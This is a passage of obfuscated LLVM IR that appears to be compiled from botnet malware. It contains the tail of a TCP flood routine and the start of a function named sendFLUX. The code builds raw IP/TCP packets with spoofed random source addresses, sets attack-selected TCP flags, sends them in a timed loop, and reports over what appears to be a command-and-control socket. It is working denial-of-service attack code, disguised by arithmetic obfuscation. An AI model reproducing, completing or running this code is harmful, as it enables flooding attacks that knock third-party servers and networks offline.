  %76 = xor i32 %74, -1
  %77 = and i32 88754937, %76
  %78 = xor i32 88754937, -1
  %79 = and i32 %74, %78
  %80 = xor i32 -1, -1
  %81 = and i32 %80, 88754937
  %82 = and i32 -1, %78
  %83 = or i32 %77, %79
  %84 = or i32 %81, %82
  %85 = xor i32 %83, %84
  %86 = xor i32 %74, -1
  store i32 %85, i32* %19, align 4
  br label %87

; <label>:87:                                     ; preds = %66, %65
  %88 = load i32, i32* %13, align 4
  %89 = sext i32 %88 to i64
  %90 = sub i64 0, 40
  %91 = sub i64 0, %89
  %92 = add i64 %90, %91
  %93 = sub i64 0, %92
  %94 = add i64 40, %89
  %95 = call i8* @llvm.stacksave()
  store i8* %95, i8** %20, align 8
  %96 = alloca i8, i64 %93, align 16
  %97 = bitcast i8* %96 to %struct.iphdr*
  store %struct.iphdr* %97, %struct.iphdr** %21, align 8
  %98 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %99 = bitcast %struct.iphdr* %98 to i8*
  %100 = getelementptr i8, i8* %99, i64 20
  %101 = bitcast i8* %100 to %struct.tcphdr*
  store %struct.tcphdr* %101, %struct.tcphdr** %22, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %104 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %103, i32 0, i32 0
  %105 = load i32, i32* %104, align 4
  %106 = load i32, i32* %19, align 4
  %107 = call i32 @GetRandomIP(i32 %106)
  %108 = call i32 @htonl(i32 %107) #13
  %109 = load i32, i32* %13, align 4
  %110 = sext i32 %109 to i64
  %111 = sub i64 0, 20
  %112 = sub i64 0, %110
  %113 = add i64 %111, %112
  %114 = sub i64 0, %113
  %115 = add i64 20, %110
  %116 = trunc i64 %114 to i32
  call void @makeIPPacket(%struct.iphdr* %102, i32 %105, i32 %108, i8 zeroext 6, i32 %116)
  %117 = call i32 @rand_cmwc()
  %118 = trunc i32 %117 to i16
  %119 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %120 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %119, i32 0, i32 0
  %121 = bitcast %union.anon.0* %120 to %struct.anon.1*
  %122 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %121, i32 0, i32 0
  store i16 %118, i16* %122, align 4
  %123 = call i32 @rand_cmwc()
  %124 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %125 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %124, i32 0, i32 0
  %126 = bitcast %union.anon.0* %125 to %struct.anon.1*
  %127 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %126, i32 0, i32 2
  store i32 %123, i32* %127, align 4
  %128 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i32 0, i32 0
  %130 = bitcast %union.anon.0* %129 to %struct.anon.1*
  %131 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %130, i32 0, i32 3
  store i32 0, i32* %131, align 4
  %132 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %133 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %132, i32 0, i32 0
  %134 = bitcast %union.anon.0* %133 to %struct.anon.1*
  %135 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %134, i32 0, i32 4
  %136 = load i16, i16* %135, align 4
  %137 = xor i16 -241, -1
  %138 = xor i16 %136, %137
  %139 = and i16 %138, %136
  %140 = and i16 %136, -241
  %141 = xor i16 %139, -1
  %142 = xor i16 80, -1
  %143 = xor i16 -25026, -1
  %144 = and i16 %141, -25026
  %145 = and i16 %139, %143
  %146 = and i16 %142, -25026
  %147 = and i16 80, %143
  %148 = or i16 %144, %145
  %149 = or i16 %146, %147
  %150 = xor i16 %148, %149
  %151 = or i16 %141, %142
  %152 = xor i16 %151, -1
  %153 = or i16 -25026, %143
  %154 = and i16 %152, %153
  %155 = or i16 %150, %154
  %156 = or i16 %139, 80
  store i16 %155, i16* %135, align 4
  %157 = load i8*, i8** %12, align 8
  %158 = call i32 @strcmp(i8* %157, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i32 0, i32 0)) #10
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %262, label %160

; <label>:160:                                    ; preds = %87
  %161 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %162 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %161, i32 0, i32 0
  %163 = bitcast %union.anon.0* %162 to %struct.anon.1*
  %164 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %163, i32 0, i32 4
  %165 = load i16, i16* %164, align 4
  %166 = xor i16 %165, -1
  %167 = xor i16 -513, -1
  %168 = xor i16 19580, -1
  %169 = or i16 %166, %167
  %170 = or i16 19580, %168
  %171 = xor i16 %169, -1
  %172 = and i16 %171, %170
  %173 = and i16 %165, -513
  %174 = xor i16 %172, -1
  %175 = xor i16 512, -1
  %176 = xor i16 -10258, -1
  %177 = and i16 %174, -10258
  %178 = and i16 %172, %176
  %179 = and i16 %175, -10258
  %180 = and i16 512, %176
  %181 = or i16 %177, %178
  %182 = or i16 %179, %180
  %183 = xor i16 %181, %182
  %184 = or i16 %174, %175
  %185 = xor i16 %184, -1
  %186 = or i16 -10258, %176
  %187 = and i16 %185, %186
  %188 = or i16 %183, %187
  %189 = or i16 %172, 512
  store i16 %188, i16* %164, align 4
  %190 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  %192 = bitcast %union.anon.0* %191 to %struct.anon.1*
  %193 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = xor i16 -1025, -1
  %196 = xor i16 %194, %195
  %197 = and i16 %196, %194
  %198 = and i16 %194, -1025
  %199 = and i16 %197, 1024
  %200 = xor i16 %197, 1024
  %201 = or i16 %199, %200
  %202 = or i16 %197, 1024
  store i16 %201, i16* %193, align 4
  %203 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 0
  %205 = bitcast %union.anon.0* %204 to %struct.anon.1*
  %206 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %205, i32 0, i32 4
  %207 = load i16, i16* %206, align 4
  %208 = xor i16 %207, -1
  %209 = xor i16 -257, -1
  %210 = xor i16 -25340, -1
  %211 = or i16 %208, %209
  %212 = or i16 -25340, %210
  %213 = xor i16 %211, -1
  %214 = and i16 %213, %212
  %215 = and i16 %207, -257
  %216 = and i16 %214, 256
  %217 = xor i16 %214, 256
  %218 = or i16 %216, %217
  %219 = or i16 %214, 256
  store i16 %218, i16* %206, align 4
  %220 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 0
  %222 = bitcast %union.anon.0* %221 to %struct.anon.1*
  %223 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = xor i16 %224, -1
  %226 = xor i16 -4097, -1
  %227 = xor i16 -12953, -1
  %228 = or i16 %225, %226
  %229 = or i16 -12953, %227
  %230 = xor i16 %228, -1
  %231 = and i16 %230, %229
  %232 = and i16 %224, -4097
  %233 = xor i16 %231, -1
  %234 = xor i16 4096, -1
  %235 = xor i16 16365, -1
  %236 = and i16 %233, 16365
  %237 = and i16 %231, %235
  %238 = and i16 %234, 16365
  %239 = and i16 4096, %235
  %240 = or i16 %236, %237
  %241 = or i16 %238, %239
  %242 = xor i16 %240, %241
  %243 = or i16 %233, %234
  %244 = xor i16 %243, -1
  %245 = or i16 16365, %235
  %246 = and i16 %244, %245
  %247 = or i16 %242, %246
  %248 = or i16 %231, 4096
  store i16 %247, i16* %223, align 4
  %249 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 0
  %251 = bitcast %union.anon.0* %250 to %struct.anon.1*
  %252 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %251, i32 0, i32 4
  %253 = load i16, i16* %252, align 4
  %254 = xor i16 -2049, -1
  %255 = xor i16 %253, %254
  %256 = and i16 %255, %253
  %257 = and i16 %253, -2049
  %258 = and i16 %256, 2048
  %259 = xor i16 %256, 2048
  %260 = or i16 %258, %259
  %261 = or i16 %256, 2048
  store i16 %260, i16* %252, align 4
  br label %409

; <label>:262:                                    ; preds = %87
  %263 = load i8*, i8** %12, align 8
  %264 = call i8* @strtok(i8* %263, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0)) #2
  store i8* %264, i8** %23, align 8
  br label %265

; <label>:265:                                    ; preds = %406, %262
  %266 = load i8*, i8** %23, align 8
  %267 = icmp ne i8* %266, null
  br i1 %267, label %268, label %408

; <label>:268:                                    ; preds = %265
  %269 = load i8*, i8** %23, align 8
  %270 = call i32 @strcmp(i8* %269, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.91, i32 0, i32 0)) #10
  %271 = icmp ne i32 %270, 0
  br i1 %271, label %290, label %272

; <label>:272:                                    ; preds = %268
  %273 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %274 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %273, i32 0, i32 0
  %275 = bitcast %union.anon.0* %274 to %struct.anon.1*
  %276 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %275, i32 0, i32 4
  %277 = load i16, i16* %276, align 4
  %278 = xor i16 %277, -1
  %279 = xor i16 -513, -1
  %280 = xor i16 -27320, -1
  %281 = or i16 %278, %279
  %282 = or i16 -27320, %280
  %283 = xor i16 %281, -1
  %284 = and i16 %283, %282
  %285 = and i16 %277, -513
  %286 = and i16 %284, 512
  %287 = xor i16 %284, 512
  %288 = or i16 %286, %287
  %289 = or i16 %284, 512
  store i16 %288, i16* %276, align 4
  br label %406

; <label>:290:                                    ; preds = %268
  %291 = load i8*, i8** %23, align 8
  %292 = call i32 @strcmp(i8* %291, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.92, i32 0, i32 0)) #10
  %293 = icmp ne i32 %292, 0
  br i1 %293, label %324, label %294

; <label>:294:                                    ; preds = %290
  %295 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %296 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %295, i32 0, i32 0
  %297 = bitcast %union.anon.0* %296 to %struct.anon.1*
  %298 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %297, i32 0, i32 4
  %299 = load i16, i16* %298, align 4
  %300 = xor i16 %299, -1
  %301 = xor i16 -1025, -1
  %302 = xor i16 1932, -1
  %303 = or i16 %300, %301
  %304 = or i16 1932, %302
  %305 = xor i16 %303, -1
  %306 = and i16 %305, %304
  %307 = and i16 %299, -1025
  %308 = xor i16 %306, -1
  %309 = xor i16 1024, -1
  %310 = xor i16 -22110, -1
  %311 = and i16 %308, -22110
  %312 = and i16 %306, %310
  %313 = and i16 %309, -22110
  %314 = and i16 1024, %310
  %315 = or i16 %311, %312
  %316 = or i16 %313, %314
  %317 = xor i16 %315, %316
  %318 = or i16 %308, %309
  %319 = xor i16 %318, -1
  %320 = or i16 -22110, %310
  %321 = and i16 %319, %320
  %322 = or i16 %317, %321
  %323 = or i16 %306, 1024
  store i16 %322, i16* %298, align 4
  br label %405

; <label>:324:                                    ; preds = %290
  %325 = load i8*, i8** %23, align 8
  %326 = call i32 @strcmp(i8* %325, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.93, i32 0, i32 0)) #10
  %327 = icmp ne i32 %326, 0
  br i1 %327, label %342, label %328

; <label>:328:                                    ; preds = %324
  %329 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %330 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %329, i32 0, i32 0
  %331 = bitcast %union.anon.0* %330 to %struct.anon.1*
  %332 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %331, i32 0, i32 4
  %333 = load i16, i16* %332, align 4
  %334 = xor i16 -257, -1
  %335 = xor i16 %333, %334
  %336 = and i16 %335, %333
  %337 = and i16 %333, -257
  %338 = and i16 %336, 256
  %339 = xor i16 %336, 256
  %340 = or i16 %338, %339
  %341 = or i16 %336, 256
  store i16 %340, i16* %332, align 4
  br label %404

; <label>:342:                                    ; preds = %324
  %343 = load i8*, i8** %23, align 8
  %344 = call i32 @strcmp(i8* %343, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.94, i32 0, i32 0)) #10
  %345 = icmp ne i32 %344, 0
  br i1 %345, label %364, label %346

; <label>:346:                                    ; preds = %342
  %347 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %348 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %347, i32 0, i32 0
  %349 = bitcast %union.anon.0* %348 to %struct.anon.1*
  %350 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %349, i32 0, i32 4
  %351 = load i16, i16* %350, align 4
  %352 = xor i16 %351, -1
  %353 = xor i16 -4097, -1
  %354 = xor i16 31378, -1
  %355 = or i16 %352, %353
  %356 = or i16 31378, %354
  %357 = xor i16 %355, -1
  %358 = and i16 %357, %356
  %359 = and i16 %351, -4097
  %360 = and i16 %358, 4096
  %361 = xor i16 %358, 4096
  %362 = or i16 %360, %361
  %363 = or i16 %358, 4096
  store i16 %362, i16* %350, align 4
  br label %403

; <label>:364:                                    ; preds = %342
  %365 = load i8*, i8** %23, align 8
  %366 = call i32 @strcmp(i8* %365, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.95, i32 0, i32 0)) #10
  %367 = icmp ne i32 %366, 0
  br i1 %367, label %398, label %368

; <label>:368:                                    ; preds = %364
  %369 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 0
  %371 = bitcast %union.anon.0* %370 to %struct.anon.1*
  %372 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %371, i32 0, i32 4
  %373 = load i16, i16* %372, align 4
  %374 = xor i16 %373, -1
  %375 = xor i16 -2049, -1
  %376 = xor i16 18539, -1
  %377 = or i16 %374, %375
  %378 = or i16 18539, %376
  %379 = xor i16 %377, -1
  %380 = and i16 %379, %378
  %381 = and i16 %373, -2049
  %382 = xor i16 %380, -1
  %383 = xor i16 2048, -1
  %384 = xor i16 -20865, -1
  %385 = and i16 %382, -20865
  %386 = and i16 %380, %384
  %387 = and i16 %383, -20865
  %388 = and i16 2048, %384
  %389 = or i16 %385, %386
  %390 = or i16 %387, %388
  %391 = xor i16 %389, %390
  %392 = or i16 %382, %383
  %393 = xor i16 %392, -1
  %394 = or i16 -20865, %384
  %395 = and i16 %393, %394
  %396 = or i16 %391, %395
  %397 = or i16 %380, 2048
  store i16 %396, i16* %372, align 4
  br label %402

; <label>:398:                                    ; preds = %364
  %399 = load i32, i32* @mainCommSock, align 4
  %400 = load i8*, i8** %23, align 8
  %401 = call i32 (i32, i8*, ...) @sockprintf(i32 %399, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.96, i32 0, i32 0), i8* %400)
  br label %402

; <label>:402:                                    ; preds = %398, %368
  br label %403

; <label>:403:                                    ; preds = %402, %346
  br label %404

; <label>:404:                                    ; preds = %403, %328
  br label %405

; <label>:405:                                    ; preds = %404, %294
  br label %406

; <label>:406:                                    ; preds = %405, %272
  %407 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %407, i8** %23, align 8
  br label %265

; <label>:408:                                    ; preds = %265
  br label %409

; <label>:409:                                    ; preds = %408, %160
  %410 = call i32 @rand_cmwc()
  %411 = trunc i32 %410 to i16
  %412 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %413 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %412, i32 0, i32 0
  %414 = bitcast %union.anon.0* %413 to %struct.anon.1*
  %415 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %414, i32 0, i32 5
  store i16 %411, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 0
  %418 = bitcast %union.anon.0* %417 to %struct.anon.1*
  %419 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %418, i32 0, i32 6
  store i16 0, i16* %419, align 4
  %420 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %421 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %420, i32 0, i32 0
  %422 = bitcast %union.anon.0* %421 to %struct.anon.1*
  %423 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %422, i32 0, i32 7
  store i16 0, i16* %423, align 2
  %424 = load i32, i32* %9, align 4
  %425 = icmp eq i32 %424, 0
  br i1 %425, label %426, label %428

; <label>:426:                                    ; preds = %409
  %427 = call i32 @rand_cmwc()
  br label %433

; <label>:428:                                    ; preds = %409
  %429 = load i32, i32* %9, align 4
  %430 = trunc i32 %429 to i16
  %431 = call zeroext i16 @htons(i16 zeroext %430) #13
  %432 = zext i16 %431 to i32
  br label %433

; <label>:433:                                    ; preds = %428, %426
  %434 = phi i32 [ %427, %426 ], [ %432, %428 ]
  %435 = trunc i32 %434 to i16
  %436 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %437 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %436, i32 0, i32 0
  %438 = bitcast %union.anon.0* %437 to %struct.anon.1*
  %439 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %438, i32 0, i32 1
  store i16 %435, i16* %439, align 2
  %440 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %441 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %442 = call zeroext i16 @tcpcsum(%struct.iphdr* %440, %struct.tcphdr* %441)
  %443 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %444 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %443, i32 0, i32 0
  %445 = bitcast %union.anon.0* %444 to %struct.anon.1*
  %446 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %445, i32 0, i32 6
  store i16 %442, i16* %446, align 4
  %447 = bitcast i8* %96 to i16*
  %448 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %449 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %448, i32 0, i32 2
  %450 = load i16, i16* %449, align 2
  %451 = zext i16 %450 to i32
  %452 = call zeroext i16 @csum(i16* %447, i32 %451)
  %453 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %454 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %453, i32 0, i32 7
  store i16 %452, i16* %454, align 2
  %455 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %456 = load i32, i32* %10, align 4
  %457 = sub i32 %455, -853428723
  %458 = add i32 %457, %456
  %459 = add i32 %458, -853428723
  %460 = add nsw i32 %455, %456
  store i32 %459, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %461

; <label>:461:                                    ; preds = %514, %513, %433
  br label %462

; <label>:462:                                    ; preds = %461
  %463 = load i32, i32* %17, align 4
  %464 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %465 = call i64 @sendto(i32 %463, i8* %96, i64 %93, i32 0, %struct.sockaddr* %464, i32 16)
  %466 = load i32, i32* %19, align 4
  %467 = call i32 @GetRandomIP(i32 %466)
  %468 = call i32 @htonl(i32 %467) #13
  %469 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %470 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %469, i32 0, i32 8
  store i32 %468, i32* %470, align 4
  %471 = call i32 @rand_cmwc()
  %472 = trunc i32 %471 to i16
  %473 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 3
  store i16 %472, i16* %474, align 4
  %475 = call i32 @rand_cmwc()
  %476 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %477 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %476, i32 0, i32 0
  %478 = bitcast %union.anon.0* %477 to %struct.anon.1*
  %479 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %478, i32 0, i32 2
  store i32 %475, i32* %479, align 4
  %480 = call i32 @rand_cmwc()
  %481 = trunc i32 %480 to i16
  %482 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %483 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %482, i32 0, i32 0
  %484 = bitcast %union.anon.0* %483 to %struct.anon.1*
  %485 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %484, i32 0, i32 0
  store i16 %481, i16* %485, align 4
  %486 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %487 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %486, i32 0, i32 0
  %488 = bitcast %union.anon.0* %487 to %struct.anon.1*
  %489 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %488, i32 0, i32 6
  store i16 0, i16* %489, align 4
  %490 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %491 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %492 = call zeroext i16 @tcpcsum(%struct.iphdr* %490, %struct.tcphdr* %491)
  %493 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %494 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %493, i32 0, i32 0
  %495 = bitcast %union.anon.0* %494 to %struct.anon.1*
  %496 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %495, i32 0, i32 6
  store i16 %492, i16* %496, align 4
  %497 = bitcast i8* %96 to i16*
  %498 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %499 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %498, i32 0, i32 2
  %500 = load i16, i16* %499, align 2
  %501 = zext i16 %500 to i32
  %502 = call zeroext i16 @csum(i16* %497, i32 %501)
  %503 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %504 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %503, i32 0, i32 7
  store i16 %502, i16* %504, align 2
  %505 = load i32, i32* %25, align 4
  %506 = load i32, i32* %15, align 4
  %507 = icmp eq i32 %505, %506
  br i1 %507, label %508, label %514

; <label>:508:                                    ; preds = %462
  %509 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %510 = load i32, i32* %24, align 4
  %511 = icmp sgt i32 %509, %510
  br i1 %511, label %512, label %513

; <label>:512:                                    ; preds = %508
  br label %521

; <label>:513:                                    ; preds = %508
  store i32 0, i32* %25, align 4
  br label %461

; <label>:514:                                    ; preds = %462
  %515 = load i32, i32* %25, align 4
  %516 = sub i32 0, %515
  %517 = sub i32 0, 1
  %518 = add i32 %516, %517
  %519 = sub i32 0, %518
  %520 = add i32 %515, 1
  store i32 %519, i32* %25, align 4
  br label %461

; <label>:521:                                    ; preds = %512
  %522 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %522)
  br label %523

; <label>:523:                                    ; preds = %521, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendFLUX(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca %struct.iphdr*, align 8
  %20 = alloca %struct.tcphdr*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %23 = load i32, i32* %12, align 4
  store i32 %23, i32* %13, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %36

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #13
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %36

; <label>:36:                                     ; preds = %31, %27
  %37 = load i8*, i8** %7, align 8
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %39 = call i32 @getHost(i8* %37, %struct.in_addr* %38)
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  br label %292

; <label>:42:                                     ; preds = %36
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %45, i32* %15, align 4
  %46 = load i32, i32* %15, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %49, label %48

; <label>:48:                                     ; preds = %42
  br label %292

; <label>:49:                                     ; preds = %42
  store i32 1, i32* %16, align 4
  %50 = load i32, i32* %15, align 4
  %51 = bitcast i32* %16 to i8*
  %52 = call i32 @setsockopt(i32 %50, i32 0, i32 3, i8* %51, i32 4) #2
  %53 = icmp slt i32 %52, 0
  br i1 %53, label %54, label %55

; <label>:54:                                     ; preds = %49
  br label %292

; <label>:55:                                     ; preds = %49
  %56 = load i32, i32* %10, align 4
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %55
  store i32 0, i32* %17, align 4
  br label %74

; <label>:59:                                     ; preds = %55
  %60 = load i32, i32* %10, align 4
  %61 = sub i32 0, %60
  %62 = add i32 32, %61
  %63 = sub nsw i32 32, %60
  %64 = shl i32 1, %62
  %65 = sub i32 0, 1
  %66 = add i32 %64, %65
  %67 = sub nsw i32 %64, 1
  %68 = xor i32 %66, -1
  %69 = and i32 -1, %68
  %70 = xor i32 -1, -1
  %71 = and i32 %66, %70
  %72 = or i32 %69, %71
  %73 = xor i32 %66, -1
  store i32 %72, i32* %17, align 4
  br label %74

; <label>:74:                                     ; preds = %59, %58
  %75 = load i32, i32* %11, align 4
  %76 = sext i32 %75 to i64
  %77 = sub i64 0, %76
  %78 = sub i64 40, %77
  %79 = add i64 40, %76
  %80 = call i8* @llvm.stacksave()
  store i8* %80, i8** %18, align 8
  %81 = alloca i8, i64 %78, align 16
  %82 = bitcast i8* %81 to %struct.iphdr*
  store %struct.iphdr* %82, %struct.iphdr** %19, align 8
  %83 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %84 = bitcast %struct.iphdr* %83 to i8*
  %85 = getelementptr i8, i8* %84, i64 20
  %86 = bitcast i8* %85 to %struct.tcphdr*
  store %struct.tcphdr* %86, %struct.tcphdr** %20, align 8
  %87 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %88 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %89 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %88, i32 0, i32 0
  %90 = load i32, i32* %89, align 4
  %91 = load i32, i32* %17, align 4
  %92 = call i32 @GetRandomIP(i32 %91)
  %93 = call i32 @htonl(i32 %92) #13
  %94 = load i32, i32* %11, align 4
  %95 = sext i32 %94 to i64
  %96 = add i64 20, 7742379035153172661
  %97 = add i64 %96, %95
  %98 = sub i64 %97, 7742379035153172661
  %99 = add i64 20, %95
  %100 = trunc i64 %98 to i32
  call void @makeIPPacket(%struct.iphdr* %87, i32 %90, i32 %93, i8 zeroext 6, i32 %100)
  %101 = call zeroext i16 @htons(i16 zeroext 5678) #13
  %102 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon.0* %103 to %struct.anon.1*
  %105 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %104, i32 0, i32 0
  store i16 %101, i16* %105, align 4
  %106 = call i32 @rand() #2
  %107 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %108 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %107, i32 0, i32 0
  %109 = bitcast %union.anon.0* %108 to %struct.anon.1*
  %110 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %109, i32 0, i32 2
  store i32 %106, i32* %110, align 4
  %111 = call i32 @rand_cmwc()
